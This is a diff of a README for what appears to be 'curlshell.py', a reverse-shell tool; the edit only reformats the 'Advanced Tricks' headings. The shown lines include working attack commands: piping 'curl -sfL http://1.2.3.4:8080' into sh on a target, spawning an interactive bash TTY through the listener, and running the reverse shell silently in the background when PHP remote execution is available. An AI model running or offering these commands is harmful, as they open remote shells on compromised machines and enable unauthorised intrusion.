@@ -48,13 +48,14 @@ curl -sfL http://1.2.3.4:8080 | sh
 ```
 
 # Advanced Tricks
-Spawn a TTY shell
+**Trick #1 - Spawn a TTY shell**
 ```sh
 stty intr undef ;
 ./curlshell.py --shell "script -qc '/bin/bash -il' /dev/null" --listen-port 8080 ; stty intr ^C
 ```
 
-Start the reverse shell as a daemon / background process. This is useful when you have remote execution via PHP:
+**Trick #2 - Start the reverse shell as a daemon / background process**  
+This is useful when you have remote execution via PHP:
 ```sh
 # On the target:
 (curl -sfL http://1.2.3.4:8080 | sh &>/dev/null &)
